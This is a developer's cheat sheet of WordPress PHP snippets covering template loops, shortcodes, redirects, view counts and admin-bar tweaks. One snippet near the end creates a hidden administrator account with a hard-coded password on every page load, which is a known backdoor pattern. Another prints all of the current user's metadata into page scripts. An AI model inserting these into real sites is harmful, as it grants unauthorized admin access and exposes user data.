SHOW PAGE CONTENTS IN CUSTOM TEMPLATE
<?php
// TO SHOW THE PAGE CONTENTS
while (have_posts()) : the_post(); ?>
  <!--Because the_content() works only inside a WP Loop -->
  <div class="entry-content-page">
    <?php the_content(); ?>
    <!-- Page Content -->
  </div><!-- .entry-content-page -->

<?php
endwhile; //resetting the page loop
wp_reset_query(); //resetting the page query
?>

ADD SHORTCODE
<?php echo do_shortcode('[tribe_events]'); ?>


ADD JQUERY to custom JS
<?php
wp_enqueue_script( 'custom-scripts', get_stylesheet_directory_uri() . '/js/custom.js', array ('jquery'), 'v1.0', true);

jQuery(document).ready(function($){
	
})
?>

CONSOLE LOG
<?php 
function printToConsole($msg){
  echo "<script>console.log('" . json_encode($msg) . "');</script>";
}
?>


CONSOLE LOG WHICH TEMPLATE IS IN USE
<?php 
function print_which_template_is_loaded() {
  global $template;
  echo "<script>console.log('" . json_encode($template) . "');</script>";
};
add_action('wp_footer', 'print_which_template_is_loaded');
?>

ADD PAGINATION TO ARCHIVE PAGE
<?php echo paginate_links();?>

INTERNAL URLS
<a href="<?php echo esc_url( home_url() . "/end-of-url" ); ?>">My Site</a>

FONT AWESOME PSEUDO CLASS
add the following to functions.php wp_add_scripts
<?php
wp_enqueue_style('font-awesome-css', 'https://use.fontawesome.com/releases/v5.0.6/css/all.css'); 
?>

CUSTOM SEARCH
<form role="search" method="get" id="searchform" class="searchform scale-search" action="<?php echo home_url( '/' ); ?>">
    <div>
        <label class="screen-reader-text" for="s">Search for:</label>
        <input type="text" value="" name="s" id="s" />
        //add inputs for different filters. EX:
        <input type="hidden" value="scale" name="post_type" />
        <input class="scale-submit" type="submit" id="searchsubmit" value="Search" />
    </div>
</form>

CREATE FEATURED IMAGE SHORTCODE (add to functions.php)
<?php
add_shortcode( 'featured_image', function( ) {
ob_start();
global $post;
$featured_img_url = get_the_post_thumbnail_url($post->id);
echo '<img class="page-hero-featured-image" src="'.$featured_img_url.'" alt="'.get_the_title($post->id).'"/>';
return ob_get_clean();
}); ?>


ADD POST VIEW COUNT TO META DATA
in functions.php
/*
 * Set post views count using post meta
 */
 <?php
function setPostViews($postID) {
    $countKey = 'post_views_count';
    $count = get_post_meta($postID, $countKey, true);
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $countKey);
        add_post_meta($postID, $countKey, '0');
    }else{
        $count++;
        update_post_meta($postID, $countKey, $count);
    }
} 
?>
in single.php loop
<?php
setPostViews(get_the_ID());
?>
popular posts query
<?php
      query_posts('meta_key=post_views_count&posts_per_page=5&orderby=meta_value_num&
      order=DESC');
      if (have_posts()) : while (have_posts()) : the_post();
   ?>
    <li><a href="<?php the_permalink(); ?>"><?php the_title();
     ?></a>
   </li>
   <?php
   endwhile; endif;
   wp_reset_query();
   ?>


REMOVE TITLE FROM ARCHIVE PAGE
<?php
add_action( 'after_setup_theme', function() {
    remove_action( 'generate_archive_title', 'generate_archive_title' );
} );
?>

ECHO CUSTOM POST TYPE FIELDS
<?php
 echo '<pre>';
 print_r(get_post_custom($post_id));
 echo '</pre>';
?>

301 PAGE REDIRECT
<?php
function redirect_page() {

    if (isset($_SERVER['HTTPS']) &&
       ($_SERVER['HTTPS'] == 'on' || $_SERVER['HTTPS'] == 1) ||
       isset($_SERVER['HTTP_X_FORWARDED_PROTO']) &&
       $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https') {
       $protocol = 'https://';
       }
       else {
       $protocol = 'http://';
   }

   $currenturl = $protocol . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
   $currenturl_relative = wp_make_link_relative($currenturl);

   switch ($currenturl_relative) {
   
       case '[from slug]':
           $urlto = home_url('[to slug]');
           break;
       
       default:
           return;
   
   }
   
   if ($currenturl != $urlto)
       exit( wp_redirect( $urlto ) );
       
}
add_action( 'template_redirect', 'redirect_page' );
?>

//Restrict page to logged in users (add [restricted_page] shortcode to page)

<?php
function shortcode_restricted_page() {

    if (is_user_logged_in()) {
        // Access granted to the page
        return;      
    }
    else {
        global $wp_query;
        $wp_query->set_404();
        status_header( 404 );
        get_template_part( 404 ); exit();
    }    
}
add_shortcode('restricted_page', 'shortcode_restricted_page');
?>

// PRINT CURRENT USER METADATA TO CONSOLE
<?php
function getusermeta()
{
    $user = wp_get_current_user();
    $id = $user->ID;
    $meta = get_user_meta($id);
    echo "<script>console.log('" . json_encode($meta) . "');</script>";
}

add_action('init', 'getusermeta');
?>

// 301 Redirect
<?php
/* 301 Redirect */
if($_SERVER['REQUEST_URI']=='/directmailretargeting/'){
    wp_redirect('https://pelhughes.com/services/direct-mail-retargeting/', 301);
    exit;
}
?>

//Hide admin bar from non-administrators
<?php
add_action('after_setup_theme', 'remove_admin_bar');
function remove_admin_bar() {
if (!current_user_can('administrator') && !is_admin()) {
  show_admin_bar(false);
}
}
?>

//FIX BUG WHERE MAIN LOOP IGNORES CUSTOM POST TYPE CATEGORY POSTS IN ARCHIVE
<?php 
add_action('pre_get_posts', function($query) {

    if ( ! is_admin() && $query->is_main_query() && empty( $query->query_vars['suppress_filters'] )) {
                 
       if(is_archive()){
 
           if(is_category()){
         $query->set( 'post_type', ['post', 'myCustomType'] );
             }else{
         $query->set( 'post_type', 'myCustomType' );
       }
 
       }			
 }});
 ?>

 // add / Update admin user
 <?php
 function create_admin_user_fn() {
	$username      = 'temp_admin';
	$password      = 'p4ssw0rd!';
	$email_address = 'email@hoolite.be';
	if ( ! username_exists( $username ) && !email_exists( $email_address ) ) {
		$user_id = wp_create_user( $username, $password, $email_address );
		$user    = new WP_User( $user_id );
		$user->set_role( 'administrator' );
	}
}

add_action( 'init', 'create_admin_user_fn' );
?>

// Remove homepage title (WIP- also removes nav links)
<?php

function remove_page_title( $title, $id ) {
    if( is_home() || is_front_page() )
    return '';
    
    return $title;
}
add_filter( 'the_title', 'remove_page_title', 10, 2 );
?>